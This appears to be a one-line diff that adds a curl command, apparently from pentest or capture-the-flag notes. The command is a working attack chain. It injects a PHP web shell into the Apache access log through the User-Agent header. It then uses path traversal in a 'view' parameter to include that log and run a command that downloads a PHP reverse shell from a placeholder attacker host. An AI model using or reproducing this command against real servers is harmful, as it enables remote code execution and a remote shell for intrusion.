@@ -1,0 +1,1 @@
+curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://pagina/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log&cmd=wget%20http%3A%2F%2Fip%3Apuerto%2Fphp-reverse-shell.php"
